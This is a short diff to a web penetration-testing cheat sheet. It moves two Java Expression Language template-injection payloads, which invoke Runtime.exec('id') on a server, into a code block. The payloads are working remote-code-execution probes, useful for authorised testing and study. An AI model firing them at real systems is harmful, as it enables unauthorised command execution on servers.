@@ -963,8 +963,10 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 ### Java Expression Language
 
-`{{T(java.lang.Runtime).getRuntime().exec('id')}}`
-`''.class.forName('java.lang.Runtime').getRuntime().exec('id')`
+```
+{{T(java.lang.Runtime).getRuntime().exec('id')}}
+''.class.forName('java.lang.Runtime').getRuntime().exec('id')
+```
 
 ### FreeMarker
 
